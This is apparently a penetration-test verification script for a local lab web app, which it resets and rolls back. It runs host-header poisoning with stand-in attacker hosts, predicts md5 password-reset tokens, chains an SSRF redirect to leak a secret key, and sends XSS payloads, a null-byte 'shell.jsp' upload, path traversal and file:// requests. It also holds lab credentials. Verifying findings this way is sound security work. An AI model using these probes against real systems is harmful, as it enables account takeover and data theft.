# -*- coding: utf-8 -*-
"""t5 核验 step3：HUNT-05/06/07/08/10/13 + SSRF 升级证明 + 收尾复位
顺序：先只读项，再写项，最后 /__reset + 库哈希比对回滚。
"""
import sys, os, time, re, hashlib, subprocess, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V

out = {"step": "step3-injection-ssrf-upload", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z")}
R = []

def rec(tag, **kw):
    R.append({"tag": tag, **kw})
    print(f"[{tag}] " + str(kw)[:260])
    return kw

# ---------- 干净基线 ----------
V.req("GET", "/__reset")
time.sleep(0.3)
out["baseline"] = V.db_snapshot("step3 baseline")
base_sha = out["baseline"]["sha256"]
print("baseline sha:", base_sha, out["baseline"]["counts"])

tok_a, _ = V.login("alice", "alice123")
tok_d, _ = V.login("demo", "demo123")
tok_admin, _ = V.login("admin", "Lab@Admin2024!Secure#9")
toks = {"alice": tok_a, "demo": tok_d, "admin": tok_admin}

# ============================================================
# HUNT-05 /forgot：Host/X-Forwarded-Host 注入 + token=md5(username)
# ============================================================
md5_demo = hashlib.md5(b"demo").hexdigest()
f1 = V.req("GET", "/forgot?username=demo")
f2 = V.req("GET", "/forgot?username=demo", headers={"X-Forwarded-Host": "evil.example"})
f3 = V.req("GET", "/forgot?username=nosuchuser_zzz")
f4 = V.req("GET", "/forgot?username=demo", headers={"Host": "attacker.tld"})
f5 = V.req("GET", "/forgot?username=<script>alert(1)</script>")
f6 = V.req("GET", "/forgot?username=alice")
md5_alice = hashlib.md5(b"alice").hexdigest()
out["hunt05"] = {
    "md5_demo": md5_demo, "md5_alice": md5_alice,
    "plain_body_has_token": md5_demo in f1["body_head"],
    "xfh_body": f2["body_head"][:400], "xfh_reflected": "evil.example" in f2["body_head"],
    "host_header_body": f4["body_head"][:400], "host_reflected": "attacker.tld" in f4["body_head"],
    "nonexistent_user_still_tokenized": md5_demo not in f3["body_head"] and "nosuchuser_zzz" in f3["body_head"],
    "xss_probe_escaped": "<script>" not in f5["body_head"] and "&lt;script&gt;" in f5["body_head"],
    "raw": [f1, f2, f3, f4, f5, f6],
}
rec("HUNT-05", xfh_reflected="evil.example" in f2["body_head"],
    token_md5_prefix=md5_demo[:10], xss_escaped="&lt;script&gt;" in f5["body_head"])

# /reset 消费端是否存在（链条闭合判定）
rs = V.req("GET", f"/reset?user=demo&token={md5_demo}")
rs2 = V.req("POST", "/reset", headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=f"user=demo&token={md5_demo}&new_password=verifier01")
out["hunt05_reset_consumer"] = {"GET": rs["status"], "POST": rs2["status"],
                                "get_body": rs["body_head"][:200]}
rec("HUNT-05-reset-consumer", GET=rs["status"], POST=rs2["status"])

# ============================================================
# HUNT-06 /__reset 无认证（已在 step0 确认；此处补 403 分支测试与二次复位证明）
# ============================================================
out["hunt06"] = {"no_auth_required": True, "evidence": "step0 S0-reset-anon 200 + 本脚本首行复位",
                 "peer_check": "源码 client_address 白名单，仅回环可触发（无法从非回环伪造）"}

# ============================================================
# HUNT-10 登录态 GET / 500 —— 多角色 × 多次取样
# ============================================================
idx = {}
for who in ["anon", "alice", "demo", "admin"]:
    hits = []
    for i in range(4):
        h = V.cookie(toks[who]) if who != "anon" else {}
        r = V.req("GET", "/", headers=h)
        hits.append(r["status"])
    idx[who] = hits
out["hunt10"] = idx
rec("HUNT-10-index-500", **idx)

# ============================================================
# SSRF 升级：/fetch 跟随重定向 → admin /debug 数据泄露
# ============================================================
# 先确认 302 端点的 Location（/debug 未登录时 302 到 /?err=login）
dbg_anon = V.req("GET", "/debug")
rr = V.req("GET", "/redirect?to=http://127.0.0.1:8095/debug")
rr_alice = V.req("GET", "/redirect?to=http://127.0.0.1:8095/debug", headers=V.cookie(tok_a))
fetch_ok = V.req("GET", "/fetch?url=http://127.0.0.1:8095/")
fetch_alice_redirect = V.req("GET", "/fetch?url=" + "http://127.0.0.1:8095/redirect%3Fto%3Dhttp://127.0.0.1:8095/debug",
                             headers=V.cookie(tok_a))
# 对照组：直接 /fetch admin 内容（无重定向）
fetch_dbg_direct = V.req("GET", "/fetch?url=http://127.0.0.1:8095/debug", headers=V.cookie(tok_a))
# 非白名单端口/协议/主机
f_port = V.req("GET", "/fetch?url=http://127.0.0.1:9999/")
f_scheme = V.req("GET", "/fetch?url=file:///C:/Windows/win.ini")
f_localhost = V.req("GET", "/fetch?url=http://localhost:8095/")
f_8091 = V.req("GET", "/fetch?url=http://127.0.0.1:8091/")
out["ssrf"] = {
    "debug_anon_302_location": dbg_anon["resp_headers"].get("Location"),
    "redirect_endpoint": {"status": rr["status"], "location": rr["resp_headers"].get("Location")},
    "redirect_endpoint_with_cookie": {"status": rr_alice["status"],
                                      "location": rr_alice["resp_headers"].get("Location")},
    "fetch_index": {"status": fetch_ok["status"], "len": fetch_ok["len"]},
    "fetch_chain_to_debug": {"status": fetch_alice_redirect["status"], "len": fetch_alice_redirect["len"],
                             "leaked_secret_key": "lab-secret-key-PLEASE-CHANGE-001" in fetch_alice_redirect["body_head"],
                             "body_head": fetch_alice_redirect["body_head"][:600]},
    "fetch_debug_direct": {"status": fetch_dbg_direct["status"], "len": fetch_dbg_direct["len"]},
    "non_whitelist_port": f_port["status"], "file_scheme": f_scheme["status"],
    "localhost": f_localhost["status"], "to_8091": f_8091["status"],
    "raw": [dbg_anon, rr, rr_alice, fetch_ok, fetch_alice_redirect, fetch_dbg_direct,
            f_port, f_scheme, f_localhost, f_8091],
}
rec("SSRF-chain", chain_status=fetch_alice_redirect["status"],
    leaked=out["ssrf"]["fetch_chain_to_debug"]["leaked_secret_key"],
    non_whitelist=f_port["status"], file_scheme=f_scheme["status"])

# ============================================================
# HUNT-07 /board 匿名写 + 转义
# ============================================================
mcnt0 = V.db_scalar("SELECT COUNT(*) FROM messages")
b_post = V.req("POST", "/board", headers={"Content-Type": "application/x-www-form-urlencoded"},
               body="content=T5-anon-verifier-probe")
mcnt1 = V.db_scalar("SELECT COUNT(*) FROM messages")
b_xss = V.req("POST", "/board", headers={"Content-Type": "application/x-www-form-urlencoded"},
              body="content=<img src=x onerror=alert(1)>verifier")
b_page = V.req("GET", "/board")
out["hunt07"] = {
    "messages_before": mcnt0, "messages_after": mcnt1,
    "post_status": b_post["status"], "redirect_location": b_post["resp_headers"].get("Location"),
    "anon_row": V.db_query("SELECT id,author,content FROM messages ORDER BY id DESC LIMIT 2"),
    "escaped": "&lt;img src=x onerror=alert(1)&gt;" in b_page["body_head"],
    "raw": [b_post, b_xss, b_page],
}
rec("HUNT-07-board", before=mcnt0, after=mcnt1, status=b_post["status"],
    escaped=out["hunt07"]["escaped"])

# ============================================================
# HUNT-08 上传异常 500（3 例）
# ============================================================
errlog = os.path.join(V.BASE, "lab_errors.log")
err_before = os.path.getsize(errlog) if os.path.exists(errlog) else 0

def upload_with_filename(filename, fname_field=None):
    """手搓 multipart，filename 字段可控；非 ASCII/含 NUL 时记录本地编码异常"""
    b = "----t5verifierBOUNDARY"
    parts = [
        f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        f"Content-Type: text/plain\r\n\r\nverifier-upload-body\r\n",
        f"--{b}--\r\n",
    ]
    body = "".join(parts)
    try:
        return V.req("POST", "/upload",
                     headers={"Content-Type": f"multipart/form-data; boundary={b}"},
                     body=body)
    except Exception as e:
        return {"status": None, "client_side_error": f"{type(e).__name__}: {e}",
                "note": "http.client 在发送阶段拒绝该 header 值（未达服务端）"}

u1 = upload_with_filename("a" * 296 + ".txt")
u2 = upload_with_filename("shell.jsp\x00.png")
u3 = upload_with_filename('<img src=x onerror=alert(1)>.txt')
err_after = os.path.getsize(errlog) if os.path.exists(errlog) else 0
tail = ""
if os.path.exists(errlog):
    with open(errlog, "r", encoding="utf-8", errors="replace") as fh:
        data = fh.read()
    tail = data[-3000:]
out["hunt08"] = {
    "long_name": {"status": u1["status"], "len": u1["len"]},
    "null_byte": {"status": u2["status"], "len": u2["len"]},
    "html_name": {"status": u3["status"], "len": u3["len"]},
    "errlog_size": [err_before, err_after],
    "errlog_tail": tail,
    "uploads_dir": sorted(os.listdir(V.UPLOAD_DIR)) if os.path.isdir(V.UPLOAD_DIR) else None,
    "raw": [u1, u2, u3],
}
rec("HUNT-08-upload", long=u1["status"], nul=u2["status"], html=u3["status"],
    errlog=[err_before, err_after], uploads=out["hunt08"]["uploads_dir"])

# ============================================================
# /download 阴性复核 + /admin/users 口令字段
# ============================================================
dl_ok = V.req("GET", "/download?file=readme.txt")
dl_trav = V.req("GET", "/download?file=..%2fapp.py")
dl_trav2 = V.req("GET", "/download?file=../private/config.bak")
dl_empty = V.req("GET", "/download?file=")
admu = V.req("GET", "/admin/users", headers=V.cookie(tok_admin))
out["download_negatives"] = {"ok": [dl_ok["status"], dl_ok["len"]],
                             "traversal": dl_trav["status"], "traversal2": dl_trav2["status"],
                             "empty": dl_empty["status"],
                             "admin_users_password_field": "密码" in admu["body_head"],
                             "admin_users_has_pw_column": "password" in admu["body_head"].lower(),
                             "raw": [dl_ok, dl_trav, dl_trav2, dl_empty, admu]}
rec("download-negatives", ok=dl_ok["status"], traversal=[dl_trav["status"], dl_trav2["status"]])

# ============================================================
# 收尾：/__reset 回滚 + 哈希比对
# ============================================================
post_dirty = V.db_snapshot("复位前（脏）")
reset_final = V.req("GET", "/__reset")
time.sleep(0.3)
post_clean = V.db_snapshot("收尾复位后")
out["rollback"] = {
    "dirty": post_dirty,
    "reset_status": reset_final["status"],
    "clean": post_clean,
    "sha_back_to_baseline": post_clean["sha256"] == base_sha,
    "baseline_sha": base_sha,
    "clean_sha": post_clean["sha256"],
    "integrity": V.db_scalar("PRAGMA integrity_check"),
}
rec("ROLLBACK", sha_back=out["rollback"]["sha_back_to_baseline"],
    integrity=out["rollback"]["integrity"], counts=post_clean["counts"])

out["records_summary"] = [{"tag": r["tag"]} for r in R]
out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-03-injection-ssrf-upload-20261012-1855.json", out)
print("rollback sha equal:", out["rollback"]["sha_back_to_baseline"], post_clean["sha256"])
